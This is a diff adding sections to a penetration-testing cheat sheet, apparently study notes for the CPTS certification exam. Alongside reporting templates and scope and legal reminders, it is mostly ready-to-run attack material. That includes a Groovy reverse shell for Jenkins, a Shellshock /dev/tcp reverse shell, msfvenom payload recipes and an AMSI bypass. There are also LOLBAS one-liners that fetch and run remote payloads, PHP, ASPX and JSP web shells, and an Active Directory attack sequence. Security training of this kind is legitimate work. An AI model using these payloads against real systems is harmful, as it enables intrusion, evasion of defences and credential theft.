+# Tomcat CGI Shellshock — when /cgi/<*.bat|*.sh> accessible:
+curl -i -A "() { :;}; echo;/bin/cat /etc/passwd" http://<h>:8080/cgi/<script>.sh
+```
+
+### 13.5 Jenkins
+
+```bash
+# Version visible at http://<h>:8080/
+# Default creds: admin/admin, jenkins/jenkins
+# IF /signup enabled → register
+# IF /script accessible → instant Groovy RCE
+curl -u admin:admin --data-urlencode "script=def proc='id'.execute(); proc.waitFor(); println proc.in.text" \
+  http://<h>:8080/scriptText
+```
+Reverse shell Groovy payload (paste in Script Console):
+```groovy
+String host="<lh>";int port=4444;String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+ while(pi.available()>0)so.write(pi.read());
+ while(pe.available()>0)so.write(pe.read());
+ while(si.available()>0)po.write(si.read());
+ so.flush();po.flush();Thread.sleep(50);
+ try{p.exitValue();break;}catch(Exception e){}
+};p.destroy();s.close();
+```
+
+### 13.6 Splunk
+
+```bash
+# Default creds: admin / changeme  OR  admin / SplunkAdmin
+# Auth → upload malicious app for RCE
+# Build Splunk app with bin/run.py revshell, upload via Settings → Apps
+msfconsole -qx "use exploit/multi/http/splunk_upload_app_exec; set RHOSTS <h>; ..."
+```
+
+### 13.7 PRTG Network Monitor
+
+- Default creds: `prtgadmin / prtgadmin` (web 8080/443).
+- Authenticated → Notifications → add EXE notification → triggers as SYSTEM.
+- CVE-2018-9276: authenticated command injection in Notification.
+
+### 13.8 osTicket
+
+- Look for sensitive data in attachments / tickets (clients often submit creds).
+- Username enum via "forgot password" responses.
+
+### 13.9 GitLab
+
+```bash
+curl -s http://<h>/help | grep -oP 'GitLab \w+ v\K[0-9.]+'
+curl -s http://<h>/api/v4/version
+# Username enum
+curl -s "http://<h>/api/v4/users?username=admin"
+# IF signup enabled → register
+# CVEs:
+# - CVE-2021-22205 (unauth RCE via ExifTool) ≤ 13.10.3
+# - CVE-2022-2884 (auth import RCE)
+# - CVE-2023-7028 (account takeover via password reset to attacker email)
+```
+
+### 13.10 ColdFusion
+
+```bash
+curl -i http://<h>/CFIDE/administrator/index.cfm
+# Default admin: admin / admin
+# CVE-2010-2861 dir traversal:
+curl "http://<h>:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties%00en"
+# CVE-2017-3066 — Java deserialization (Flex AMF)
+# Once admin → Scheduled Tasks → run a CFM file → RCE
+```
+
+### 13.11 IIS — Tilde (8.3) Enumeration
+
+```bash
+python3 IIS_shortname_Scanner.py http://<h>
+sudo nmap --script http-iis-short-name-brute -p80 <h>
+```
+
+### 13.12 LDAP Injection (application-level)
+
+- Login bypass payloads:
+  ```
+  *)(uid=*))(|(uid=*
+  *)(&)
+  ```
+- Boolean extraction: `*)(cn=a*)`, `*)(cn=b*)` — narrow per char.
+
+### 13.13 Web Mass Assignment
+
+```bash
+curl -X PUT http://<h>/api/users/me -H "Content-Type: application/json" \
+     -d '{"name":"john","email":"j@x.io","is_admin":true}'
+```
+- Common vulnerable fields: `role`, `isAdmin`, `is_active`, `verified`, `balance`, `owner`, `tenant_id`.
+
+### 13.14 Shellshock (CVE-2014-6271) on CGI
+
+```bash
+curl -A "() { :;}; echo; echo VULN" http://<h>/cgi-bin/test.sh
+curl -A "() { :;}; /bin/bash -i >& /dev/tcp/<lh>/4444 0>&1" http://<h>/cgi-bin/<script>
+# Try as User-Agent, Cookie, Referer, Host headers
+```
+
+### 13.15 Thick-Client Applications
+
+```bash
+file <binary>
+strings -a <binary> | grep -iE 'pass|key|http|sql'
+strings -el <binary>                                     # 16-bit unicode
+# .NET → dnSpy / ILSpy
+# Java → jadx-gui app.jar
+# Native → Ghidra / IDA
+# Hunt for: hardcoded creds, internal endpoints, hidden URLs, custom protocols
+# Then test the back-end API / RPC just like any web target
+```
+
+---
+
+## 14. Vulnerability Assessment Workflow
+
+### 14.1 CVSS Scoring (do this for every finding)
+
+Use https://www.first.org/cvss/calculator/3.1 — never invent scores.
+
+| Finding | Typical CVSSv3.1 base |
+| --- | --- |
+| Default creds + RCE | 9.8 (Critical) |
+| Unauth RCE | 9.8 |
+| Auth RCE | 8.8 |
+| SQLi unauth | 9.8 |
+| SQLi auth | 8.8 |
+| Directory listing | 5.3 |
+| Info disclosure (config) | 5.3 |
+| Outdated software w/ known CVE | varies |
+| Missing security headers | 4.3 |
+| Self-XSS | 3.5 |
+| Stored XSS | 6.1 |
+
+### 14.2 Nessus workflow
+
+```text
+1) /etc/init.d/nessusd start → https://localhost:8834
+2) Policies → New Policy → "Advanced Scan"
+   - Discovery → custom port range "1-65535"
+   - Assessment → enable web app tests, thorough tests
+   - Credentials → SSH/Windows for authenticated scan (much higher signal)
+3) Scans → New Scan → use the policy → set Targets
+4) Launch → wait
+5) Export → HTML for client; Nessus DB for re-import; CSV for triage
+6) Triage findings: read plugin output details to dismiss false positives
+```
+
+### 14.3 OpenVAS / GVM workflow
+
+```bash
+sudo gvm-setup           # one-time
+sudo gvm-start
+# Web UI: https://127.0.0.1:9392
+# Configuration → Targets → New (specify hosts)
+# Scans → Tasks → New (pick target + scan config "Full and Fast")
+# Run → Reports
+```
+
+### 14.4 Manual prioritisation checklist (in lieu of vuln scanner)
+
+- Critical → unauth RCE / SQLi / file upload to RCE
+- High → auth RCE / DCSync prerequisites / weak creds on admin endpoints
+- Medium → IDOR / XXE / SSRF / outdated software (no PoC)
+- Low → info leaks / missing headers / verbose errors
+
+---
+
+## 15. Burp Suite / ZAP Workflow
+
+### 15.1 First-time setup
+
+```text
+1) Burp → Proxy → Options → Intercept Off
+2) Browser → set proxy 127.0.0.1:8080 (or use Burp's embedded Chromium)
+3) Visit http://burp → Download CA cert → import into browser as Trusted Root
+4) Set Target → Scope → only your in-scope domains/IPs
+```
+
+### 15.2 Manual testing flow
+
+```text
+Proxy → click through entire app                    (populates Target)
+Target → Scope → tick "Show only in-scope items"
+Target → Site map → right-click each interesting request → "Send to Repeater"
+Repeater → modify each parameter / header / method
+For complex iteration → "Send to Intruder"
+```
+
+### 15.3 Burp Intruder — 4 attack types
+
+| Attack type | Payload sets | Use case |
+| --- | --- | --- |
+| **Sniper** | 1 set, hits one position at a time | Test each parameter individually |
+| **Battering Ram** | 1 set, same value all positions | Same value in multiple places |
+| **Pitchfork** | 1 set per position, parallel | Username:Password pairing |
+| **Cluster Bomb** | 1 set per position, cartesian | User × Password permutations |
+
+```text
+1) Send request to Intruder
+2) Clear payload positions; mark only the field(s) to fuzz with §
+3) Pick attack type
+4) Payloads tab → load wordlist
+5) Settings → Grep – Match → "incorrect" / "invalid" to filter
+6) Start Attack → sort by Length / Status
+```
+
+### 15.4 Match & Replace (auto-modification)
+
+```text
+Proxy → Match and Replace → Add rule:
+  - Match: User-Agent regex
+  - Replace: New UA / SQLi probe / XSS canary
+Apply to: requests
+```
+
+### 15.5 Burp Scanner (Pro) / ZAP equivalent
+
+```text
+Burp:  Crawl (Spider) → Active Scan → Issues → Report
+ZAP:   Spider → Active Scan → Alerts → Report
+```
+
+### 15.6 ZAP Fuzzer (free Intruder alternative)
+
+```text
+1) Right-click request in History → Attack → Fuzz
+2) Add Locations (the fields)
+3) Add Payloads (file/strings/script)
+4) Optional Processors (URL encode, base64)
+5) Start → Sort by Code/Size/Time
+```
+
+### 15.7 Useful BApp / ZAP add-ons
+
+- **Logger++** — full request log with regex search
+- **Autorize** — IDOR / authorization checking
+- **Param Miner** — hidden parameter discovery
+- **Hackvertor** — fast encoding/transformation
+- **Active Scan++** — extra scan checks
+- **Collaborator** (Pro) / OAST Server — OOB testing
+
+---
+
+## 16. Metasploit Framework Workflow
+
+### 16.1 Boot & search
+
+```bash
+sudo systemctl start postgresql
+msfdb init
+msfconsole -q
+msf6> db_status
+msf6> workspace -a exam-2025
+msf6> db_nmap -sV -p- 10.10.10.0/24                # auto-imports
+msf6> hosts; services; vulns
+msf6> search type:exploit ms17-010
+```
+
+### 16.2 Module workflow
+
+```text
+use exploit/windows/smb/ms17_010_eternalblue
+info
+options                              # show RHOSTS, LHOST, etc.
+set RHOSTS 10.10.10.5
+set LHOST tun0
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LPORT 443
+check                                # safety check
+exploit -j                           # background as a job
+sessions -l
+sessions -i 1
+```
+
+### 16.3 Common payloads
+
+| Payload | When |
+| --- | --- |
+| `windows/x64/meterpreter/reverse_https` | best stealth on outbound 443 |
+| `windows/x64/meterpreter/reverse_tcp` | simple, common |
+| `linux/x64/meterpreter/reverse_tcp` | Linux meterpreter |
+| `cmd/unix/reverse_bash` | minimalist, bash-only |
+| `python/meterpreter/reverse_tcp` | Linux, Python only |
+| `windows/x64/shell_reverse_tcp` | when meterpreter is too noisy |
+| `java/jsp_shell_reverse_tcp` | Tomcat WAR |
+
+### 16.4 msfvenom recipes
+
+```bash
+# Windows EXE
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lh> LPORT=443 -f exe -o sh.exe
+# Windows DLL
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lh> LPORT=4444 -f dll -o sh.dll
+# Linux ELF
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -f elf -o sh
+# PowerShell base64
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -f psh-cmd -o sh.cmd
+# ASPX
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -f aspx -o sh.aspx
+# WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lh> LPORT=4444 -f war -o sh.war
+# Stageless (one-shot, larger but no second connection)
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<lh> LPORT=443 -f exe -o sh.exe
+# Encoded — x86 (shikata_ga_nai, most iterations = more evasion, larger file)
+msfvenom -p windows/x86/shell_reverse_tcp LHOST=<lh> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o sh.exe
+# Encoded — x64
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o sh.exe
+# Fileless — IEX DownloadString (no disk write)
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lh> LPORT=443 -f psh -o payload.ps1
+# Then: iex (iwr http://<lh>/payload.ps1 -UseBasicParsing).Content
+```
+
+#### AV / AMSI Evasion Quick-Reference
+
+```powershell
+# AMSI bypass (run before any offensive PS import)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Bypass PS execution policy
+powershell -ep bypass -c "<command>"
+powershell -exec bypass -enc <base64-command>
+
+# AppLocker bypass (write to allowed paths)
+# Allowed by default: C:\Windows\Temp\, C:\Windows\System32\spool\drivers\color\
+copy payload.exe C:\Windows\System32\spool\drivers\color\payload.exe
+
+# PS v2 downgrade (bypasses AMSI/ScriptBlock logging on old systems)
+powershell -Version 2 -c "<command>"
+
+# LOLBAS alternatives when exe blocked (no disk):
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell");h.run("calc");
+regsvr32 /s /n /u /i:http://<lh>/payload.sct scrobj.dll
+mshta http://<lh>/payload.hta
+```
+
+### 16.5 Multi/handler
+
+```text
+use exploit/multi/handler
+set PAYLOAD <same payload as msfvenom>
+set LHOST tun0
+set LPORT 443
+set ExitOnSession false
+exploit -j
+```
+
+### 16.6 Meterpreter post-ex
+
+```text
+sysinfo                          # OS, arch
+getuid                           # current user
+getsystem                        # try LSA / SeImpersonate / KiTrap0D
+hashdump                         # local SAM (need SYSTEM)
+load kiwi                        # mimikatz module
+kiwi> creds_all
+load incognito                   # token impersonation
+list_tokens -u
+impersonate_token "DOMAIN\\admin"
+ps                                # processes
+migrate <pid>                    # move into another process
+shell                             # native shell
+download / upload                # file transfer
+portfwd add -l 1234 -p 3389 -r 10.10.10.5     # forward through session
+run autoroute -s 10.10.10.0/24                # add route through session
+run post/multi/recon/local_exploit_suggester  # next-step ideas
+```
+
+### 16.7 Pivoting via Metasploit (full)
+
+```text
+sessions -i 1
+meterpreter > run autoroute -s 10.10.10.0/24
+meterpreter > background
+msf6> use auxiliary/server/socks_proxy
+msf6> set SRVPORT 1080 ; set VERSION 5
+msf6> run -j
+# /etc/proxychains4.conf: socks5 127.0.0.1 1080
+proxychains4 nmap -sT -Pn 10.10.10.5
+```
+
+---
+
+## 17. Web Information Gathering (External / OSINT)
+
+### 17.1 WHOIS
+
+```bash
+whois <domain>                                  # registrar, abuse contact
+whois <ip>                                      # network owner / ASN
+curl -s "https://rdap.org/domain/<domain>" | jq
+```
+
+### 17.2 DNS recon (full)
+
+```bash
+dig +short A     <domain>
+dig +short MX    <domain>
+dig +short NS    <domain>
+dig +short TXT   <domain>
+dig +short CNAME www.<domain>
+
+dnsrecon -d <domain> -t std,brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -j dnsrecon.json
+
+amass enum -d <domain> -o amass.txt
+subfinder -d <domain> -all -recursive -o subfinder.txt
+assetfinder --subs-only <domain> | tee assetfinder.txt
+findomain -t <domain>
+cat amass.txt subfinder.txt assetfinder.txt | sort -u > subs.txt
+
+dnsx -l subs.txt -resp -o resolved.txt
+httpx -l subs.txt -threads 50 -title -tech-detect -status-code -o httpx.txt
+```
+
+### 17.3 Certificate Transparency
+
+```bash
+curl -s "https://crt.sh/?q=%25.<domain>&output=json" | jq -r '.[].name_value' | sort -u
+cero <ip-or-host>                                # pulls SAN from cert
+```
+
+### 17.4 Robots.txt / sitemap / well-known
+
+```bash
+curl -s http://<h>/robots.txt
+curl -s http://<h>/sitemap.xml
+curl -s http://<h>/.well-known/
+# /.well-known/security.txt
+# /.well-known/openid-configuration   (OIDC issuer details)
+# /.well-known/jwks.json              (signing keys)
+# /.well-known/change-password
+```
+
+### 17.5 Wayback Machine / archive
+
+```bash
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.<domain>/*&output=text&fl=original&collapse=urlkey" \
+  | sort -u > wayback.txt
+echo <domain> | gau --threads 5 > urls.txt
+grep -E "\?" urls.txt | qsreplace FUZZ > params.txt
+```
+
+### 17.6 Search engine dorking
+
+```text
+site:<domain>                                  → indexed pages
+site:<domain> -www                              → drop main site
+site:<domain> ext:pdf|doc|xls|sql|env|log
+site:<domain> intext:"index of /"
+site:<domain> intitle:"login"
+site:<domain> inurl:"admin"
+site:github.com "<domain>" password
+site:stackoverflow.com "<domain>"
+site:pastebin.com "<domain>"
+"<company>" filetype:env "DB_PASSWORD"
+```
+
+### 17.7 Recon frameworks
+
+```bash
+theHarvester -d <domain> -b all -f harvester
+spiderfoot -l 127.0.0.1:5001
+finalrecon --headers --crawl --whois --dns -u http://<h>
+```
+
+### 17.8 Crawling & JS analysis
+
+```bash
+katana -u http://<h>/ -d 5 -jc -o crawl.txt
+hakrawler -u http://<h>/ -d 5
+gospider -s http://<h>/ -t 20 -c 10 -d 4 -o gospider/
+
+# JS file analysis
+linkfinder.py -i http://<h>/static/js/main.js -o cli
+```
+
+---
+
+## 18. Documentation & Reporting (Full Structure)
+
+### 18.1 Note-taking — required structure during exam
+
+```
+exam/
+├── 0-scope/
+│   ├── ROE.txt                    # Rules of Engagement (copy from email)
+│   └── targets.txt
+├── 1-recon/
+│   ├── nmap/
+│   ├── enum-<host>/
+│   └── osint/
+├── 2-foothold/
+│   ├── <host>-<service>/exploit-cmd.txt
+│   └── <host>-<service>/screenshot-1.png
+├── 3-postex/
+│   ├── creds.txt                   # the ONE master file
+│   ├── linpeas-<host>.txt
+│   └── winpeas-<host>.txt
+├── 4-pivot/
+│   └── ssh/chisel/ligolo/configs/
+├── 5-loot/
+│   └── <host>/                     # everything pulled off targets
+├── 6-flags/
+│   └── <host>-flag.txt             # one file per flag
+├── 7-screenshots/
+│   ├── 001-foothold-host1.png
+│   └── 002-priv-esc-host1.png
+└── 8-report/
+    ├── attack-chain.md
+    ├── findings/
+    │   └── <id>-<title>.md
+    └── final/
+        └── pentest-report.md
+```
+
+### 18.2 Report types
+
+| Type | When | Audience |
+| --- | --- | --- |
+| **Draft Report** | Before retest/QA | Internal / client lead |
+| **Final Report** | End of engagement | All stakeholders |
+| **Attestation** | Compliance (PCI/HIPAA) | Auditors |
+| **Executive Summary** | Standalone exec brief | C-suite |
+| **Vulnerability Notification** | Critical findings during testing | Client immediately |
+
+### 18.3 Standard report sections (CPTS-mandated structure)
+
+```text
+1. Title page
+2. Statement of Confidentiality
+3. Executive Summary
+   - Engagement scope
+   - Approach (black/grey/white box)
+   - Key findings (bullets, no jargon)
+   - Risk picture (heatmap or 5-bucket count)
+   - Strategic recommendations
+4. Attack Narrative / Storyline
+   - Step-by-step from foothold → DA / final objective
+   - Diagrams of network + path
+5. Findings (one per vuln)
+   - Title / Severity / CVSS
+   - Description
+   - Affected hosts/URLs
+   - Steps to Reproduce (numbered, exact commands, screenshots)
+   - Evidence
+   - Impact
+   - Remediation
+   - References
+6. Appendices
+   - Tools used
+   - List of in-scope hosts
+   - Cracked credentials (redacted in client deliverable)
+   - Scan output extracts
+   - Remediation checklist
+```
+
+### 18.4 Finding write-up template
+
+```markdown
+## [F-001] Default Credentials on Tomcat Manager — Critical (CVSS 9.8)
+
+**Affected**: 10.10.10.5:8080/manager/html
+
+### Description
+The Tomcat Manager interface is exposed on the network with the default
+credentials `tomcat:tomcat`. An attacker with network access can deploy an
+arbitrary WAR file, achieving remote code execution as the Tomcat user (which
+on this host is SYSTEM).
+
+### Steps to Reproduce
+1. Confirm reachability:
+   `curl -i http://10.10.10.5:8080/manager/html`
+2. Authenticate with default creds `tomcat:tomcat` (Screenshot 1).
+3. Generate a malicious WAR file:
+   `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o sh.war`
+4. Deploy:
+   `curl -u tomcat:tomcat --upload-file sh.war "http://10.10.10.5:8080/manager/text/deploy?path=/sh"`
+5. Trigger callback (Screenshot 2): `curl http://10.10.10.5:8080/sh/`
+6. Receive SYSTEM shell on listener (Screenshot 3): `nc -lvnp 4444`
+
+### Impact
+Full system compromise of the Tomcat host, leading to lateral movement into
+the internal network and theft of any data accessible by SYSTEM.
+
+### Remediation
+- Change the Tomcat manager credentials to a unique, complex password.
+- Restrict /manager and /host-manager to internal IPs via `RemoteAddrValve`
+  in tomcat-users.xml.
+- Audit `tomcat-users.xml` for any other default or weak credentials.
+
+### References
+- https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html
+- CWE-521: Weak Password Requirements
+- CWE-798: Use of Hard-coded Credentials
+```
+
+### 18.5 Executive Summary template (1 page)
+
+```text
+[Company] engaged [Tester] to perform a [black/grey/white]-box internal
+network penetration test from <date> to <date>.
+
+The objective was to identify vulnerabilities that could be exploited by
+an attacker with [no/limited/standard-user] access and to determine the
+overall security posture of the internal estate.
+
+Key Findings:
+  • [N] Critical, [N] High, [N] Medium, [N] Low
+  • Domain Administrator privileges were obtained within [hours]
+  • Cleartext credentials for [N] privileged users were recovered
+
+Strategic Recommendations:
+  1. Patch outdated [systems] (See F-001 through F-004)
+  2. Enforce strong password policy and disable PASSWD_NOTREQD accounts
+  3. Audit Group Policy Preferences for cpassword fields
+  4. Rotate krbtgt twice (12+ hours apart) to invalidate forged tickets
+```
+
+### 18.6 Attack chain (write while you work)
+
+```text
+External → Foothold → Local PrivEsc → Lateral → DA / Goal
+1. http://blog.inlanefreight.local — outdated WP plugin → RCE as www-data
+2. www-data → /var/backups/db.sql contains MySQL root password
+3. MySQL root → wrote /var/www/html/sh.php → RCE as Apache user
+4. Apache user → tar SUID misconfiguration → root
+5. Root → SSH key reuse → access dev01.inlanefreight.local
+6. dev01 → linpeas → kerberos ticket file in /tmp/krb5cc_*
+7. Used ticket → access fileserver.inlanefreight.local
+8. Snaffler → cpassword in Groups.xml → svc_backup
+9. svc_backup is in Backup Operators → DCSync via Volume Shadow → DA
+```
+
+### 18.7 Cleanup checklist (before closing the engagement)
+
+- [ ] Remove every uploaded webshell / WAR / EXE.
+- [ ] Disable / remove any added user accounts.
+- [ ] Delete any added scheduled tasks / cron jobs / services.
+- [ ] Remove SSH authorized_keys entries you added.
+- [ ] Restore service binPaths you modified.
+- [ ] Remove registry keys you added (Run, autostart).
+- [ ] Stop and remove any persistence.
+- [ ] Note any artifact left where you couldn't reach it (e.g., a rooted but unreachable host) so the client can finish cleanup.
+
+---
+
+## 19. Pentest Process Stages (the path framework)
+
+```
+┌──────────────────────────────────────────────────────────────┐
+│ 1. Pre-Engagement                                            │
+│    - Scoping questionnaire, NDA, ROE, kickoff meeting        │
+│    - Test windows agreed, emergency contacts, IPs whitelisted│
+├──────────────────────────────────────────────────────────────┤
+│ 2. Information Gathering                                     │
+│    - OSINT (whois, DNS, CT logs, search dorks, wayback)      │
+│    - Active recon (port scan, banners, vhosts)               │
+├──────────────────────────────────────────────────────────────┤
+│ 3. Vulnerability Assessment                                  │
+│    - Manual + automated identification                       │
+│    - Prioritise by CVSS + business context                   │
+├──────────────────────────────────────────────────────────────┤
+│ 4. Exploitation                                              │
+│    - Initial foothold (web/service exploit)                  │
+│    - Privilege escalation (local)                            │
+├──────────────────────────────────────────────────────────────┤
+│ 5. Post-Exploitation                                         │
+│    - Pillaging (creds, configs, sensitive data)              │
+│    - Persistence (only if scope allows)                      │
+│    - Internal recon                                          │
+├──────────────────────────────────────────────────────────────┤
+│ 6. Lateral Movement                                          │
+│    - Pivot, repeat 2-5 in deeper segments                    │
+│    - Build attack chain to objective (DA, PII, etc.)         │
+├──────────────────────────────────────────────────────────────┤
+│ 7. Proof-of-Concept                                          │
+│    - Capture screenshots, flags, evidence                    │
+├──────────────────────────────────────────────────────────────┤
+│ 8. Post-Engagement                                           │
+│    - Cleanup, retest, deliverables, debrief                  │
+└──────────────────────────────────────────────────────────────┘
+```
+
+The CPTS exam tests stages 2-7 + reporting. Always know which stage you're in and don't skip ahead — most stuck moments come from skipping enumeration to jump to exploitation.
+
+### 19.1 Pre-Engagement scoping items (the questionnaire)
+
+- Type of test (black/grey/white box)
+- Targets (IPs/CIDRs/URLs/Domains)
+- Out-of-scope items (production DB, customer data, third-party hosts)
+- Test windows (business hours? after hours?)
+- Allowed techniques (DoS? social engineering? phishing?)
+- Credentials provided?
+- Reporting deliverables (draft, final, executive)
+- Emergency contact (24/7 escalation)
+- Evidence handling / data retention rules
+
+### 19.2 Laws & ethics — you MUST stay in scope
+
+- CFAA (US), Computer Misuse Act (UK), Section 66 IT Act (India), GDPR (EU).
+- If you find something out of scope by accident → stop, document, ask the client before continuing.
+
+---
+
+## 20. Bind vs. Reverse Shell Decision
+
+| Network condition | Best option |
+| --- | --- |
+| Target can reach attacker (default) | Reverse shell |
+| Target is behind NAT, attacker not | Reverse shell |
+| Target has firewall blocking outbound | Bind shell (if inbound to high port allowed) |
+| Both behind NAT | Pivot first / catch via SOCKS |
+| Egress-only HTTPS / 443 | Reverse over HTTPS (meterpreter reverse_https on 443) |
+| Outbound DNS only | dnscat2 / DNS exfil |
+| Outbound ICMP only | ptunnel-ng |
+
+```bash
+# Bind shell (Linux)
+nc -lvnp 4444 -e /bin/bash                   # legacy nc, often blocked
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
+
+# Reverse shell catcher (Linux)
+sudo nc -lvnp 4444
+pwncat-cs -lp 4444                            # auto TTY upgrade + tools
+```
+
+---
+
+## 21. Web Shell Library (per-language reference)
+
+```php
+<?php @eval($_REQUEST['c']); ?>
+
+<?php
+if(isset($_GET['c'])) { echo "<pre>".shell_exec($_GET['c'])."</pre>"; }
+?>
+```
+
+```aspx
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%
+    string c = Request["c"];
+    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe","/c "+c);
+    psi.RedirectStandardOutput = true;
+    psi.UseShellExecute = false;
+    Process p = Process.Start(psi);
+    Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
+%>
+```
+
+```jsp
+<%@ page import="java.util.*,java.io.*"%>
+<%
+    if (request.getParameter("c") != null) {
+        Process p = Runtime.getRuntime().exec(request.getParameter("c"));
+        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String l; while((l=r.readLine())!=null) out.println(l);
+    }
+%>
+```
+
+Pre-built helpers:
+- **/usr/share/laudanum** (Kali) — PHP/ASP/JSP webshell collection.
+- **Antak** (`/usr/share/webshells/aspx/Antak.aspx`) — full ASPX webshell.
+- **WSO** (PHP webshell with file manager).
+- **p0wnyshell** (single-file PHP, terminal-emulating).
+
+---
+
+## 22. File Transfer Code Library
+
+### 22.1 Updog (Python HTTP server with upload)
+
+```bash
+pipx install updog
+updog -d /tmp/share -p 9999                  # GET + POST upload UI on :9999
+```
+
+### 22.2 PHP server (one-liner)
+
+```bash
+php -S 0.0.0.0:8080 -t /tmp/share
+```
+
+### 22.3 Bash /dev/tcp download (no curl/wget)
+
+```bash
+exec 3<>/dev/tcp/<lh>/80
+printf 'GET /file HTTP/1.0\r\nHost: x\r\n\r\n' >&3
+cat <&3 > /tmp/file
+```
+
+### 22.4 Python uploader (catch-only)
+
+```python
+python3 -c "
+from http.server import *
+class H(BaseHTTPRequestHandler):
+  def do_POST(s):
+    l=int(s.headers['Content-Length']); d=s.rfile.read(l)
+    open('out.bin','wb').write(d); s.send_response(200); s.end_headers()
+HTTPServer(('0.0.0.0',9999),H).serve_forever()"
+```
+
+### 22.5 PowerShell modern download
+
+```powershell
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add('User-Agent','Mozilla/5.0')
+$wc.DownloadFile('http://<lh>/nc.exe','C:\Temp\nc.exe')
+
+# TLS-required environments
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$wc.DownloadFile('https://<lh>/nc.exe','C:\Temp\nc.exe')
+```
+
+### 22.6 VBScript downloader
+
+```vbscript
+Set xHttp = CreateObject("MSXML2.ServerXMLHTTP")
+Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "http://<lh>/nc.exe", False
+xHttp.Send
+bStrm.Type = 1 : bStrm.Open
+bStrm.Write xHttp.responseBody
+bStrm.SaveToFile "C:\Windows\Temp\nc.exe", 2
+```
+
+### 22.7 JavaScript / WSH downloader
+
+```javascript
+var x = new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","http://<lh>/nc.exe",false);
+x.send();
+var s = new ActiveXObject("ADODB.Stream");
+s.Type = 1; s.Open(); s.Write(x.responseBody);
+s.SaveToFile("C:\\Windows\\Temp\\nc.exe", 2);
+```
+Run with: `cscript //nologo //e:javascript dl.js`.
+
+### 22.8 Living-off-the-Land Binaries (Windows full list)
+
+| Binary | Purpose |
+| --- | --- |
+| certutil | download + base64 |
+| bitsadmin | background download |
+| msiexec | install + execute MSI from URL |
+| mshta | execute remote HTA |
+| regsvr32 | execute remote SCT (Squiblydoo) |
+| rundll32 | execute DLL exports |
+| wmic | execute XSL via wmic |
+| installutil | execute .NET assemblies |
+| odbcconf | execute remote DLL |
+| forfiles | exec arbitrary command |
+| ftp -s:cmds.txt | scriptable FTP download |
+
+### 22.9 Living-off-the-Land Binaries (Linux)
+
+```bash
+# /dev/tcp                     download (covered above)
+# wget / curl                  standard
+# python3 -m http.server       host
+# php / ruby / perl one-liners
+# busybox httpd                if curl/wget missing
+busybox httpd -p 8888 -h /tmp/share
+# scp / rsync                  if SSH available
+# nc -q 0 <h> 80 < file        netcat send
+```
+
+---
+
+## 23. Quick AD attack ordering cheat-sheet (when you have ANY domain creds)
+
+```
+1.  nxc smb <dc> -u <u> -p <p>                                  → confirm creds work
+2.  nxc smb <dc> -u <u> -p <p> --pass-pol                       → policy (lockout!)
+3.  nxc smb <dc> -u <u> -p <p> --users --groups                 → harvest users
+4.  nxc ldap <dc> -u <u> -p <p> --asreproast asrep.hash         → AS-REP roastable
+5.  nxc ldap <dc> -u <u> -p <p> --kerberoasting kerb.hash       → SPN accounts
+6.  hashcat -m 18200 asrep.hash rockyou.txt -r best64.rule      → crack AS-REP
+7.  hashcat -m 13100 kerb.hash rockyou.txt -r best64.rule       → crack TGS
+8.  bloodhound-python -d <dom> -u <u> -p <p> -ns <dc> -c All    → BloodHound
+9.  Mark current user "owned" → check "Outbound Object Control"
+10. Spray every cracked password against every host (matrix in §3.3)
+11. nxc smb <cidr> -u <u> -p <p> -M spider_plus                 → share secrets
+12. nxc ldap <dc> -u <u> -p <p> -M laps                         → LAPS read?
+13. nxc ldap <dc> -u <u> -p <p> --gmsa                          → gMSA read?
+14. certipy find -u <u>@<dom> -p <p> -dc-ip <dc> -vulnerable    → ADCS misconfigs
+15. PetitPotam / printerbug + ntlmrelayx if signing OFF / ADCS web enrollment
+16. NoPac (any user → DC) — try last as it's loud
+```
+
+---
+
+## 24. Final Service-Port Quick Reference
 
 | Port | Service | First commands |
 | --- | --- | --- |
@@ -4475,113 +4642,6 @@ Run this top to bottom every time you've spent >30 minutes without progress.
 | 9200 | Elasticsearch | `curl http://<ip>:9200/_cat/indices` |
 | 11211 | Memcached | `nc <ip> 11211` `stats` |
 | 27017 | MongoDB | `mongo <ip>:27017`, no-auth check |
-
----
-
----
-
-## Appendix A — Common Service-Default-Credentials cheat-sheet
-
-| Service | Default users | Default passwords |
-| --- | --- | --- |
-| Tomcat manager | tomcat, admin, root | tomcat, admin, s3cret, password |
-| JBoss / Wildfly | admin | admin, jboss, password |
-| Jenkins | admin | admin, password |
